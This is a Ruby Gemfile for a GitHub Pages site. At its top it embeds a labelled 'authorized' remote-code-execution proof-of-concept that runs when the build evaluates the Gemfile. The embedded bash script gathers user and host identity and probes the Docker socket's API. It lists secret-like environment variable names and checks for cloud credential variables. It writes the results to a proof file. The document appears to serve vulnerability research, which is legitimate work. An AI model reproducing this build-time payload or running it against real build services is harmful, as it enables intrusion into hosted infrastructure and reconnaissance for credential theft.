# Authorized bounded GitHub Pages Gemfile RCE validation.
require "open3"
marker = "PAGES_GEMFILE_RCE_20260919143910-844d92"
cmd = "echo \"### identity\"
id
whoami
hostname
uname -a
pwd
echo \"### container indicators\"
cat /proc/1/cgroup 2>&1 | head -20
echo \"### docker socket\"
ls -l /var/run/docker.sock 2>&1 || true
python3 - <<'PY'
import socket, sys
path=\"/var/run/docker.sock\"
s=socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
try:
    s.settimeout(3)
    s.connect(path)
    s.sendall(b\"GET /_ping HTTP/1.1\\r\\nHost: docker\\r\\n\\r\\n\")
    data=s.recv(200)
    print(\"docker_api_ping=\"+data.decode(\"latin1\", \"replace\").replace(\"\\r\",\"\\\\r\").replace(\"\\n\",\"\\\\n\"))
except Exception as e:
    print(\"docker_api_ping_error=\"+repr(e))
finally:
    try: s.close()
    except Exception: pass
s=socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
try:
    s.settimeout(3)
    s.connect(path)
    s.sendall(b\"GET /version HTTP/1.1\\r\\nHost: docker\\r\\n\\r\\n\")
    data=s.recv(1200)
    print(\"docker_api_version_prefix=\"+data.decode(\"latin1\", \"replace\").replace(\"\\r\",\"\\\\r\").replace(\"\\n\",\"\\\\n\")[:1000])
except Exception as e:
    print(\"docker_api_version_error=\"+repr(e))
finally:
    try: s.close()
    except Exception: pass
PY
echo \"### cloud credentials and secret-like environment names (names only)\"
env | cut -d= -f1 | sort | grep -Ei 'token|secret|key|credential|password|passwd|aws|azure|google|connection|database|github|actions' || true
echo \"### cloud credential variable presence (values not printed)\"
for v in AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_WEB_IDENTITY_TOKEN_FILE AWS_ROLE_ARN AZURE_CLIENT_ID AZURE_TENANT_ID AZURE_FEDERATED_TOKEN_FILE GOOGLE_APPLICATION_CREDENTIALS; do
  if [ -n \"\\${!v:-}\" ]; then echo \"$v=present\"; else echo \"$v=absent\"; fi
done
echo \"### available tooling\"
for t in docker aws curl python3; do command -v \"$t\" || true; done
echo \"### mounts containing docker/container/github\"
grep -Ei 'docker|container|github|actions|/var/run' /proc/self/mountinfo | head -40 || true"
stdout, stderr, status = Open3.capture3("/bin/bash", "-lc", cmd)
proof = []
proof << "marker=#{marker}"
proof << "utc=#{Time.now.utc.strftime('%Y-%m-%dT%H:%M:%SZ')}"
proof << "cmd=#{cmd}"
proof << "exit=#{status.exitstatus}"
proof << "--- stdout ---"
proof << stdout
proof << "--- stderr ---"
proof << stderr
proof << "--- context ---"
proof << "id=#{%x(id).strip}"
proof << "whoami=#{%x(whoami).strip}"
proof << "hostname=#{%x(hostname).strip}"
proof << "ruby=#{RUBY_VERSION}"
proof << "pwd=#{Dir.pwd}"
proof << "GITHUB_ACTION_REPOSITORY=#{ENV.fetch('GITHUB_ACTION_REPOSITORY', '<unset>')}"
proof << "GITHUB_ACTION_REF=#{ENV.fetch('GITHUB_ACTION_REF', '<unset>')}"
proof << "GITHUB_REPOSITORY=#{ENV.fetch('GITHUB_REPOSITORY', '<unset>')}"
File.write(File.join(__dir__, "pages-gemfile-rce-20260919143910-844d92.txt"), proof.join("\n") + "\n")
source "https://rubygems.org"
gem "github-pages", "= 232"
